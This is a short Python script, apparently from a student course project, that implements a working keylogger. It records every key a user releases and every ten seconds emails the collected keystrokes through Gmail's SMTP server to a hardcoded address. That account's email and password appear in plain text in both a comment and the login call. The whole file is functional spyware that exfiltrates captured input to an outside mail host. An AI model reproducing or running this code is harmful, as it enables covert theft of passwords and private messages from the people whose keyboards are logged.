import keyboard #For the keyloggs
import smtplib #Enables sending emails using the Simple Mail Transfer Protocol (SMTP)
from threading import Timer #Enables the functions to run in intervals
from threading import Semaphore #For blocking current thread


#Email: fannyandanna@gmail.com
#password: TNM031Keylogger

class KeyLogg: 
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.sem = Semaphore(0)

    def sendToEmail(self, resultingText):
        #Connect to our server
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        #Login to gmail account
        server.login('fannyandanna@gmail.com', 'TNM031KeyLogger')
        server.sendmail('fannyandanna@gmail.com', 'fannyandanna@gmail.com', resultingText)
        #end session
        server.quit()

    def on_press(self, event):      
        name = event.name           
        self.log += name
    
    def result(self):

        if self.log:
            self.sendToEmail(self.log)
        
        self.log = ""
        Timer(interval=self.interval, function= self.result).start()
    
    def start(self):
        keyboard.on_release(callback=self.on_press)
        self.result()
        self.sem.acquire()

if __name__ == "__main__":
    keylogger = KeyLogg(interval = 10)
    keylogger.start()
